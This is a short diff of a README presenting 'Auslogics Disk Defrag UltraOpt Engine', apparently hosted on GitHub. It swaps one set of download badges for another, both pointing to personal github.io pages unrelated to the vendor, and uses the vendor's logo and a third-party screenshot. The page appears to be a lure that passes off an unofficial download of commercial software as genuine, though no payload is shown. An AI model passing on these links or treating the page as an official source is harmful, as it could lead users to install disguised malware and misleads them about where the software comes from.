@@ -1,15 +1,12 @@
 # Auslogics Disk Defrag UltraOpt Engine
 
-<div align="center">
+
   <img src="https://www.auslogics.com/includes/press/images/company-logo-white.png" max-width="900px" height="auto;">
 </div>  
 <br>
 
-<div align="center">
+[![GET disk defrag](https://img.shields.io/badge/GET%20%E2%80%94%20disk-defrag-0078D6?style=for-the-badge&logoColor=white)](https://talsanniyy.github.io/.github/disk-defrag)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://disk-defrag-ultraopt-engine.github.io/.github/)
-
-</div>
 
 ---
 
@@ -26,11 +23,8 @@
   <img src="https://images.filepuma.com/screenshots/system_utilities/auslogics_disk_defrag/wa_FP-auslogics_disk_defrag_f1c668ccc96b330a54825525267.jpg" width="800"/> 
 </div>
 
-<div align="center">
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://disk-defrag-ultraopt-engine.github.io/.github/)
-
-</div>
+[![GET disk defrag](https://img.shields.io/badge/GET%20%E2%80%94%20disk-defrag-0078D6?style=for-the-badge&logoColor=white)](https://talsanniyy.github.io/.github/disk-defrag)
 
 ---
 
